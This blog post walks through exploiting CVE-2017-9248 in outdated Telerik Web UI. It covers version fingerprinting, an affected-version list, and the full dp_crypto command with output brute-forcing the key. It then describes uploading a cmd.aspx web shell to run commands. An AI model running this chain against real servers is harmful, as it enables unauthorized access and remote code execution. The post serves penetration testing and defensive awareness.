---
layout: post
title:  "Pwning Web Applications via Telerik Web UI"
date:   2018-08-03
categories: pentest
---

## Introduction 

Over the past 3 months, I’ve encountered a number of web applications that were using Telerik Web UI components for their application’s interface. There’s nothing wrong with using third party component to make your application’s interface the way you want it. However, a vulnerability in this component could cause you harm. 


In this post, I’m going to show you how I pwned several web applications, specifically ASP.NET ones, by abusing an outdated version of Telerik Web UI.  

## Identification

The simplest way to check if the application is using Telerik Web UI is to view its HTML source code just like here. 
![Source1](/static/img/10/01.png)
> _**TIP #1:** There are times where you’ll not find exactly the string `Telerik.Web.UI` from the HTML code. However, if you find the string `Telerik`, just keep on browsing the other pages of the application and search for the string `Telerik.Web.UI` again._


If you’ve identified that the application is using Telerik Web UI, the next step is to identify the version of Telerik Web UI and check if it’s vulnerable to [**CVE-2017-9248**](https://www.telerik.com/support/kb/aspnet-ajax/details/cryptographic-weakness).  
Finding the version can either be easy or tricky. To get the exact version, just view the HTML code again. In the case below, the version information sits right next to the string `Telerik.Web.UI`. That’s easy.
![Source2](/static/img/10/02.png)

However, there are cases where the version is not located right next to the string “**Telerik.Web.UI**”. Another way to identify for the version of Telerik Web UI is by going through the HTML comments just like here. So you could just view the HTML code and search for the string `<!-- 20`.
![Source3](/static/img/10/03.png)

Once you have the version information, cross-reference it with the list of vulnerable versions. Based on the [exploitation tool](https://github.com/bao7uo/dp_crypto) written by Paul Taylor ([@bao7uo](https://twitter.com/bao7uo)), the following versions are affected:
```
2007.1423        2008.31314       2010.31317        2013.1.403        2015.2.729
2007.1521        2009.1311        2011.1315         2013.1.417        2015.2.826
2007.1626        2009.1402        2011.1413         2013.2.611        2015.3.930
2007.2918        2009.1527        2011.1519         2013.2.717        2015.3.1111
2007.2101        2009.2701        2011.2712         2013.3.1015       2016.1.113
2007.21107       2009.2826        2011.2915         2013.3.1114       2016.1.225
2007.31218       2009.31103       2011.31115        2013.3.1324       2016.2.504
2007.31314       2009.31208       2011.3.1305       2014.1.225        2016.2.607
2007.31425       2009.31314       2012.1.215        2014.1.403        2016.3.914
2008.1415        2010.1309        2012.1.411        2014.2.618        2016.3.1018
2008.1515        2010.1415        2012.2.607        2014.2.724        2016.3.1027
2008.1619        2010.1519        2012.2.724        2014.3.1024       2017.1.118
2008.2723        2010.2713        2012.2.912        2015.1.204        2017.1.228
2008.2826        2010.2826        2012.3.1016       2015.1.225        2017.2.503
2008.21001       2010.2929        2012.3.1205       2015.1.401        2017.2.621
2008.31105       2010.31109       2012.3.1308       2015.2.604        2017.2.711
2008.31125       2010.31215       2013.1.220        2015.2.623        2017.3.913
```

## Exploitation

Before jumping to the exploitation, we have to locate first the "Dialog Handler" `Telerik.Web.UI.DialogHandler.aspx`. Most of the time, it’s located at the root directory of the application. If it’s not there, try the sub-directories. To verify if you’ve found the right location, you should see the string `Loading the dialog…` when accessing the dialog handler.
![Loading](/static/img/10/04.png)
> _**TIP #2:** Sometimes, the sub-directory where the dialog handler is located (or where Telerik Web UI is located in general) can be found from the HTML source code._

For the exploitation, use the tool written by Paul Taylor which can be downloaded [here](https://github.com/bao7uo/dp_crypto). Credits and big thanks to him for writing this one. Here’s an example of the tool running to bruteforce the key and discover the hidden link to access the **Document Manager** page.
```bash
root@kali:~# python dp_crypto.py -k http://www.example.com/Telerik.Web.UI.DialogHandler.aspx 48 hex 9

dp_crypto by Paul Taylor / Foregenix Ltd
CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise

Attacking http://www.example.com/Telerik.Web.UI.DialogHandler.aspx
to find key of length [48] with accuracy threshold [9]
using key charset [01234567890ABCDEF]

Key position 01: {D} found with 31 requests, total so far: 31
Key position 02: {3} found with 10 requests, total so far: 41
Key position 03: {A} found with 35 requests, total so far: 76
Key position 04: {D} found with 46 requests, total so far: 122
<------------------------ SNIPPED ------------------------>
Key position 45: {B} found with 50 requests, total so far: 1638
Key position 46: {3} found with 36 requests, total so far: 1674
Key position 47: {3} found with 50 requests, total so far: 1724
Key position 48: {F} found with 57 requests, total so far: 1781
Found key: D3AD[redacted]B33F
Total web requests: 1781
2014.3.1024: http://www.example.com/Telerik.Web.UI.DialogHandler.aspx?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=[snipped&redacted]
```

Once we access the discovered link, we can see that we now have access to all the files and folders of the web server. More importantly, we can see that we can upload arbitrary files to the server.
![Document Manager](/static/img/10/05.png)

Here’s an example of the shell **cmd.aspx** file that I uploaded. 
![Shell](/static/img/10/06.png)

And here’s an example of command execution using the uploaded shell.
![Shell Upload](/static/img/10/07.png)

## Telewreck

As part of my learning process, I decided to create a Burp Suite extension that can detect and exploit vulnerable instance of Telerik Web UI. I named it **Telewreck** and is available at [https://github.com/capt-meelo/Telewreck](https://github.com/capt-meelo/Telewreck). 

When running a passive scan, this extension will look for vulnerable versions of Telerik Web UI.
![Passive](/static/img/10/08.png)

Here’s what the tab looks like where you can perform the exploitation.
![Tab](/static/img/10/09.png)

That's it. Feel free to contribute in the development of the tool and report/fix some issues.
